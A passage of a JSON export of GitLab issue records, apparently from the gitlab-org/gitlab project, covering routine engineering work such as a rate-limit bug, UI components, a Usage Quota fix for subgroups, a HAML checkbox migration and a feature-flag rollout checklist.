Pitino","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f0db032076c54065b10b3efdfd175e6c?s=80\u0026d=identicon","web_url":"https://gitlab.com/fabiopitino"},"labels":["Category:Continuous Integration","Eng-Inter-Dept::Rate Limits","Verify::P1","availability::limit","backend","bug::performance","corrective action","devops::verify","feature flag","feature::addition","group::pipeline execution","missed:14.10","priority::1","section::ops","severity::1","type::bug","workflow::verification"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":695467,"username":"fabiopitino","name":"Fabio Pitino","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f0db032076c54065b10b3efdfd175e6c?s=80\u0026d=identicon","web_url":"https://gitlab.com/fabiopitino"}],"author":{"id":695467,"username":"fabiopitino","name":"Fabio Pitino","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f0db032076c54065b10b3efdfd175e6c?s=80\u0026d=identicon","web_url":"https://gitlab.com/fabiopitino"},"type":"ISSUE","assignee":{"id":695467,"username":"fabiopitino","name":"Fabio Pitino","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f0db032076c54065b10b3efdfd175e6c?s=80\u0026d=identicon","web_url":"https://gitlab.com/fabiopitino"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358425","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":50,"completed_count":26},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"26 of 50 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358425","notes":"https://gitlab.com/api/v4/projects/278964/issues/358425/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358425/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358425","relative":"#358425","full":"gitlab-org/gitlab#358425"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106330567,"iid":358413,"project_id":278964,"title":"[Frontend] Create a branch filter component for compliance violations","description":"## Problem to solve\n\nAdd a component that can be used on the compliance report to allow the user to select whether they want to display violations for `All branches` or `All protected branches`.\n\n## Proposed solution\n\n1. Add a new branch select component with the two options.\n1. By default filter by `All branches`.\n\n## Design\n\nhttps://gitlab.com/gitlab-org/gitlab/-/issues/356582/designs/Compliance_report_filters.png\n\n## Implementation\n\n~frontend weight of :two: \n\n1. Add a new branch filter component for the compliance report using [`GlDropdown`](https://gitlab-org.gitlab.io/gitlab-ui/?path=/story/base-dropdown--default) as a base.\n\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e\n*This page may contain information related to upcoming products, features and functionality.\nIt is important to note that the information presented is for informational purposes only, so please do not rely on the information for purchasing or planning purposes.\nJust like with all projects, the items mentioned on the page are subject to change or delay, and the development, release, and timing of any products, features, or functionality remain at the sole discretion of GitLab Inc.*\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e","state":"closed","created_at":"2022-04-08T13:17:52.651Z","updated_at":"2022-05-03T09:02:28.802Z","closed_at":"2022-05-03T09:02:28.784Z","closed_by":{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"},"labels":["Category:Compliance Management","GitLab Ultimate","devops::manage","direction","documentation","frontend","group::compliance","priority::1","section::dev","type::feature","workflow::verification"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"}],"author":{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"},"type":"ISSUE","assignee":{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358413","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":2,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358413","notes":"https://gitlab.com/api/v4/projects/278964/issues/358413/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358413/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358413","relative":"#358413","full":"gitlab-org/gitlab#358413"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7916,"epic":{"id":502210,"iid":7916,"title":"MVP filter violations by all branches or all protected branches","url":"/groups/gitlab-org/-/epics/7916","group_id":9970,"human_readable_timestamp":"\u003cstrong\u003e272\u003c/strong\u003e days elapsed"},"iteration":null,"health_status":null},{"id":106325271,"iid":358400,"project_id":278964,"title":"Change user_ids in the service layer to user_id for create/invite service","description":"The following discussion from !81019 should be addressed:\n\n- [ ] @dstull started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/81019#note_902883951):  (+1 comment)\n\n    \u003e yeah - this isn't ideal(having to manipulate the `user_id` to be `user_ids`) - but with the changes to the service layer during last MR review to rely on the base class's params in `Members::CreateService` - we now have to do this.\n    \u003e \n    \u003e As a follow-up we should change `user_ids` in the service layer to `user_id` I believe and then we can remove this in the API layer.\n    \u003e \n    \u003e However, doing that here would be too large and add too much scope to this MR.","state":"closed","created_at":"2022-04-08T11:46:22.350Z","updated_at":"2022-05-17T21:01:32.666Z","closed_at":"2022-05-17T21:01:32.623Z","closed_by":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"labels":["devops::growth","group::acquisition","maintenance::refactor","section::growth","type::maintenance","workflow::in review"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"}],"author":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"type":"ISSUE","assignee":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358400","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358400","notes":"https://gitlab.com/api/v4/projects/278964/issues/358400/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358400/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358400","relative":"#358400","full":"gitlab-org/gitlab#358400"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106323502,"iid":358394,"project_id":278964,"title":"Follow-up from \"Add a dropdown to switch language in code blocks\"","description":"The following discussion from !69131 should be addressed:\n\n- [ ] @pslaughter started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/69131#note_905112081):  (+1 comment)\n\n    \u003e **suggestion:** Overwriting `props` in an `onBeforeUpdate` without calling `setProps`, is the React equivalent of mutating props within a Vue component. Is there a different way we can establish the position of this?\n    \u003e \n    \u003e How about using [`popperOptions`](https://atomiks.github.io/tippyjs/v6/all-props/#popperoptions) and popper modifiers?\n    \u003e \n    \u003e Here's a patch which attempts to do this:\n    \u003e \n    \u003e \u003cdetails\u003e\n    \u003e \n    \u003e ```patch\n    \u003e diff --git a/app/assets/javascripts/content_editor/components/code_block_bubble_menu.vue b/app/assets/javascripts/content_editor/components/code_block_bubble_menu.vue\n    \u003e index 9d42d63862f..9525b505ce4 100644\n    \u003e --- a/app/assets/javascripts/content_editor/components/code_block_bubble_menu.vue\n    \u003e +++ b/app/assets/javascripts/content_editor/components/code_block_bubble_menu.vue\n    \u003e @@ -40,6 +40,34 @@ export default {\n    \u003e        languageLoader: new CodeBlockLanguageLoader(lowlight),\n    \u003e      };\n    \u003e    },\n    \u003e +  computed: {\n    \u003e +    tippyOptions() {\n    \u003e +      return {\n    \u003e +        popperOptions: {\n    \u003e +          modifiers: [\n    \u003e +            {\n    \u003e +              name: 'topLogger',\n    \u003e +              enabled: true,\n    \u003e +              phase: 'beforeWrite',\n    \u003e +              fn: ({ state }) =\u003e {\n    \u003e +                const { top, left, width } = this.getOffset();\n    \u003e +                const { width: popperWidth } = state.elements.popper.getBoundingClientRect();\n    \u003e +\n    \u003e +                const newTop = top - 40;\n    \u003e +                const newLeft = left + (width / 2) - (popperWidth / 2);\n    \u003e +\n    \u003e +                state.styles.popper.transform = '';\n    \u003e +                state.styles.popper.top = `${newTop}px`;\n    \u003e +                state.styles.popper.left = `${newLeft}px`;\n    \u003e +\n    \u003e +                return state;\n    \u003e +              },\n    \u003e +            }\n    \u003e +          ]\n    \u003e +        }\n    \u003e +      }\n    \u003e +    },\n    \u003e +  },\n    \u003e    methods: {\n    \u003e      shouldShow: ({ editor }) =\u003e {\n    \u003e        return CODE_BLOCK_NODE_TYPES.some((type) =\u003e editor.isActive(type));\n    \u003e @@ -98,6 +126,29 @@ export default {\n    \u003e        }\n    \u003e      },\n    \u003e  \n    \u003e +    getOffset() {\n    \u003e +      const { view } = this.tiptapEditor;\n    \u003e +      const { from } = this.tiptapEditor.state.selection;\n    \u003e +\n    \u003e +      for (let { node } = view.domAtPos(from); node; node = node.parentElement) {\n    \u003e +        if (node.nodeName?.toLowerCase() === 'pre') {\n    \u003e +          return {\n    \u003e +            left: node.offsetLeft,\n    \u003e +            top: node.offsetTop,\n    \u003e +            width: node.offsetWidth,\n    \u003e +            height: node.offsetHeight,\n    \u003e +          }\n    \u003e +        }\n    \u003e +      }\n    \u003e +\n    \u003e +      return {\n    \u003e +        left: -1000,\n    \u003e +        top: -1000,\n    \u003e +        width: 0,\n    \u003e +        height: 0,\n    \u003e +      };\n    \u003e +    },\n    \u003e +\n    \u003e      deleteCodeBlock() {\n    \u003e        this.tiptapEditor.chain().focus().deleteNode(this.getCodeBlockType()).run();\n    \u003e      },\n    \u003e @@ -115,7 +166,7 @@ export default {\n    \u003e      :editor=\"tiptapEditor\"\n    \u003e      plugin-key=\"bubbleMenuCodeBlock\"\n    \u003e      :should-show=\"shouldShow\"\n    \u003e -    :tippy-options=\"{ onBeforeUpdate: tippyOnBeforeUpdate }\"\n    \u003e +    :tippy-options=\"tippyOptions\"\n    \u003e    \u003e\n    \u003e      \u003ceditor-state-observer @transaction=\"getSelectedLanguage\"\u003e\n    \u003e        \u003cgl-button-group\u003e\n    \u003e diff --git a/app/assets/javascripts/content_editor/services/code_block_language_loader.js b/app/assets/javascripts/content_editor/services/code_block_language_loader.js\n    \u003e index 3c12cf614a5..bcac554bcfd 100644\n    \u003e --- a/app/assets/javascripts/content_editor/services/code_block_language_loader.js\n    \u003e +++ b/app/assets/javascripts/content_editor/services/code_block_language_loader.js\n    \u003e @@ -1,3 +1,6 @@\n    \u003e +import { lowlight as lowlightDefault } from 'lowlight/lib/core';\n    \u003e +import { memoize } from 'lodash';\n    \u003e +\n    \u003e  export default class CodeBlockLanguageLoader {\n    \u003e    constructor(lowlight) {\n    \u003e      this.lowlight = lowlight;\n    \u003e @@ -33,3 +36,5 @@ export default class CodeBlockLanguageLoader {\n    \u003e      return Promise.all(loaders);\n    \u003e    }\n    \u003e  }\n    \u003e +\n    \u003e +export const getDefaultLanguageLoader = memoize(() =\u003e new CodeBlockLanguageLoader(lowlightDefault));\n    \u003e \n    \u003e ```\n    \u003e \n    \u003e \u003c/details\u003e","state":"closed","created_at":"2022-04-08T11:02:41.284Z","updated_at":"2022-05-02T17:33:31.977Z","closed_at":"2022-05-02T17:33:31.951Z","closed_by":{"id":2398164,"username":"himkp","name":"Himanshu Kapoor","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2398164/avatar.png","web_url":"https://gitlab.com/himkp"},"labels":["Category:Wiki","Content Editor","devops::create","group::editor","maintenance::refactor","section::dev","type::maintenance"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":2398164,"username":"himkp","name":"Himanshu Kapoor","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2398164/avatar.png","web_url":"https://gitlab.com/himkp"}],"author":{"id":2398164,"username":"himkp","name":"Himanshu Kapoor","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2398164/avatar.png","web_url":"https://gitlab.com/himkp"},"type":"ISSUE","assignee":{"id":2398164,"username":"himkp","name":"Himanshu Kapoor","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2398164/avatar.png","web_url":"https://gitlab.com/himkp"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358394","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358394","notes":"https://gitlab.com/api/v4/projects/278964/issues/358394/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358394/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358394","relative":"#358394","full":"gitlab-org/gitlab#358394"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106312996,"iid":358382,"project_id":278964,"title":"Projects in subgroups not shown in group Usage Quota page","description":"## Problem\n\nWhen visiting the group `Usage Quota` page, the breakdown of consumption by project bar graph does not show projects that are in subgroups. Only projects directly descendants of the top-level namespace are being displayed. Data for this chart is from the GraphQL endpoint\n\nThe table of projects and overall CI Minutes seem to include those projects (data from these is taken from the controller)\n\n## Desired Outcome / solution\n\n* All graphs in the Group Usage Quota page show CI Minutes for all projects in the group and sub-groups.\n\n## Possible Technical Solutions\n\nThe GraphQL endpoint should be augmented to include sub-group data\n\n### Technical Details\n\nIn [`Ci::Minutes::ProjectMonthlyUsage#for_namespace_monthly_usage`](https://gitlab.com/gitlab-org/gitlab/-/blob/15e1fb160071d1dbf4cdc3103930a2c4259a76f9/ee/app/models/ci/minutes/project_monthly_usage.rb#L17) we only list projects directly part of a `namespace_id`. Instead we should use all its descendants.\n\nSomething like:\n\n```ruby\nall_namespace_ids = namespace_monthly_usage.namespace.self_and_descendant_ids\nwhere(\n  date: namespace_monthly_usage.date,\n  project: Ci::ProjectMirror.by_namespace_id(all_namespace_ids).select(:project_id)\n)\n```\n\nEnsure that the fix works for both graphs `CI minutes` breakdown per project and `Shared runners duration` breakdown per project.","state":"closed","created_at":"2022-04-08T08:56:57.034Z","updated_at":"2022-06-07T18:26:34.382Z","closed_at":"2022-05-31T13:22:14.177Z","closed_by":{"id":695467,"username":"fabiopitino","name":"Fabio Pitino","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f0db032076c54065b10b3efdfd175e6c?s=80\u0026d=identicon","web_url":"https://gitlab.com/fabiopitino"},"labels":["CI minutes","Category:Continuous Integration","backend","devops::verify","group::pipeline execution","priority::2","section::ops","severity::2","type::bug","workflow::production"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":9767370,"username":"ffarukh","name":"Firdaws Farukh","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f9ffec1ae6c28212690c41044f1d9c17?s=80\u0026d=identicon","web_url":"https://gitlab.com/ffarukh"}],"author":{"id":695467,"username":"fabiopitino","name":"Fabio Pitino","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f0db032076c54065b10b3efdfd175e6c?s=80\u0026d=identicon","web_url":"https://gitlab.com/fabiopitino"},"type":"ISSUE","assignee":{"id":9767370,"username":"ffarukh","name":"Firdaws Farukh","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f9ffec1ae6c28212690c41044f1d9c17?s=80\u0026d=identicon","web_url":"https://gitlab.com/ffarukh"},"user_notes_count":16,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358382","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358382","notes":"https://gitlab.com/api/v4/projects/278964/issues/358382/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358382/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358382","relative":"#358382","full":"gitlab-org/gitlab#358382"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7561,"epic":{"id":442014,"iid":7561,"title":"CI minutes and Runner Duration Visibility Charts MVC","url":"/groups/gitlab-org/-/epics/7561","group_id":9970,"human_readable_end_date":"Aug 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106309387,"iid":358343,"project_id":278964,"title":"Replace generic checkbox with GitLab UI styled checkbox in app/views/projects/settings/ci_cd/_form.html.haml","description":"The HAML template `app/views/projects/settings/ci_cd/_form.html.haml` contains a reference to the `f.check_box` form helper method which generates a vanilla `\u003cinput type=\"checkbox\" /\u003e` element. We want to migrate these to the [styled checkboxes](https://design.gitlab.com/components/checkbox) defined in the Pajamas design system.\n\nThere are rails helpers for radios and checkboxes which will generate these styled checkboxes and radio buttons for you. You can read their documentation [here](https://gitlab.com/gitlab-org/gitlab/-/blob/master/doc/development/fe_guide/haml.md#gitlab-ui-form-builder).\n\n## How to migrate\n\nMigrating `f.check_box` to `f.gitlab_ui_checkbox_component` can be done with the following steps:\n\n1. Change `form_for` to `gitlab_ui_form_for`. Sometimes when dealing with small partials this call to `form_for` instance is actually found in a parent template so you may need to dig around for it.\n2. Change `f.check_box` to `f.gitlab_ui_checkbox_component`.\n3. Remove `f.label` and instead pass the label as the second argument in `f.gitlab_ui_checkbox_component`.\n4. Optionally remove any secondary text for this checkbox and pass it as the `help_text` argument in `f.gitlab_ui_checkbox_component`.\n\n**Notes:**\n\n* If the form helper method for the checkbox you are attempting to migrate is using a `bootstrap_form_for` block (rather than `form_for` or `gitlab_ui_form_for`) this is a special case, and we need to create an issue to migrate away from the `bootstrap_form` gem. Please ping `@mikegreiling` in this issue.\n* Issues are being created for each HAML partial in which `f.check_box` is found. There may be other checkboxes in the same form or page that make sense to migrate within a single merge request. If you work on these, ensure you assign yourself in the issues associated with those other HAML partials as well so that you do not duplicate someone else's work.\n* If this checkbox requires any special QA data attributes or classes, these can be passed in the `checkbox_options` argument.\n\n## Example Migration:\n\n- Before:\n\n  ```haml\n  = form_for @group do |f|\n    .form-group.gl-mb-3\n      .gl-form-checkbox.custom-control.custom-checkbox\n        = f.check_box :prevent_sharing_groups_outside_hierarchy, disabled: !can_change_prevent_sharing_groups_outside_hierarchy?(@group), class: 'custom-control-input'\n        = f.label :prevent_sharing_groups_outside_hierarchy, class: 'custom-control-label' do\n          %span\n            = s_('GroupSettings|Prevent members from sending invitations to groups outside of %{group} and its subgroups.').html_safe % { group: link_to_group(@group) }\n          %p.help-text= prevent_sharing_groups_outside_hierarchy_help_text(@group)\n  ```\n\n- After:\n\n  ```haml\n  = gitlab_ui_form_for @group do |f|\n    .form-group.gl-mb-3\n      = f.gitlab_ui_checkbox_component :prevent_sharing_groups_outside_hierarchy,\n          s_('GroupSettings|Prevent members from sending invitations to groups outside of %{group} and its subgroups.').html_safe % { group: link_to_group(@group) },\n          help_text: prevent_sharing_groups_outside_hierarchy_help_text(@group),\n          checkbox_options: { disabled: !can_change_prevent_sharing_groups_outside_hierarchy?(@group) }\n  ```\n\nYou can also look at [this commit](https://gitlab.com/gitlab-org/gitlab/-/commit/9df3f64aa391854d8e52295b6268b262f35aeb31) for another example migration.","state":"closed","created_at":"2022-04-08T08:09:00.575Z","updated_at":"2022-11-22T18:45:43.961Z","closed_at":"2022-04-19T11:46:44.736Z","closed_by":{"id":9299375,"username":"dzubova","name":"Diana Zubova","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9299375/avatar.png","web_url":"https://gitlab.com/dzubova"},"labels":["OKR","SUS::Impacting","Unplanned","component:checkbox","devops::manage","frontend","group::purchase","pajamas::integrate","section::dev","severity::4","type::maintenance","workflow::production"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":9299375,"username":"dzubova","name":"Diana Zubova","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9299375/avatar.png","web_url":"https://gitlab.com/dzubova"}],"author":{"id":636429,"username":"mikegreiling","name":"Mike Greiling","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/636429/avatar.png","web_url":"https://gitlab.com/mikegreiling"},"type":"ISSUE","assignee":{"id":9299375,"username":"dzubova","name":"Diana Zubova","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9299375/avatar.png","web_url":"https://gitlab.com/dzubova"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358343","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358343","notes":"https://gitlab.com/api/v4/projects/278964/issues/358343/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358343/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358343","relative":"#358343","full":"gitlab-org/gitlab#358343"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7878,"epic":{"id":495635,"iid":7878,"title":"Checkboxes \u003e HAML \u003e Migrate check_box form helper to gitlab_ui_checkbox_component","url":"/groups/gitlab-org/-/epics/7878","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106307719,"iid":358296,"project_id":278964,"title":"[Feature flag] Rollout of update_storage_usage_design","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout [Usage Quota Standardization - Storage](https://gitlab.com/gitlab-org/gitlab/-/issues/350646) on production, that is currently behind the `update_storage_usage_design` feature flag.\n\nThe feature will change the design of the storage usage for namespaces on **free plan** only.\n\n## Owners\n\n- Team: utilization\n- Most appropriate slack channel to reach out to: `#g_utilization`\n- Best individual to reach out to: `@aalakkad` and `@sheldonled` \n- PM: `@doniquesmit` \n\n## Expectations\n\n### What are we expecting to happen?\n\nThe design of the groups storage usage will change, specifically two blocks will be replacing 3 old blocks\n\n### When is the feature viable?\n\nN/A\n\n### What might happen if this goes wrong?\n\nIf things goes wrong, the page will show wrong numbers/details about the used and purchased storage, which might confuse the users.\n\n### What can we monitor to detect problems with this?\n\nN/A\n\n### What can we check for monitoring production after rollouts?\n\nN/A\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [x] Enable the feature globally on non-production environments.\n    - [x] `/chatops run feature set update_storage_usage_design true --dev`\n    - [x] `/chatops run feature set update_storage_usage_design true --staging`\n- [x] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n - If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [x] `/chatops run feature set --group=gitlab-org update_storage_usage_design true`\n    - [x] `/chatops run feature set --group=gitlab-com update_storage_usage_design true`\n- [x] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [x] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [x] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [x] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [x] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com. \n- [x] Ensure that any breaking changes have been announced following the [release post process](https://about.gitlab.com/handbook/marketing/blog/release-posts/#deprecations-removals-and-breaking-changes) to ensure GitLab customers are aware.\n- [x] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [x] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [x] `/chatops run feature set update_storage_usage_design 25 --actors`\n    - [x] `/chatops run feature set update_storage_usage_design 50 --actors`\n    - [x] `/chatops run feature set update_storage_usage_design 100 --actors`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set update_storage_usage_design true`\n- [x] Announce on [the feature issue](https://gitlab.com/gitlab-org/gitlab/-/issues/358296) that the feature has been globally enabled.\n- [x] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\nYou can either [create a follow-up issue for Feature Flag Cleanup](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) or use the checklist below in this same issue.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the 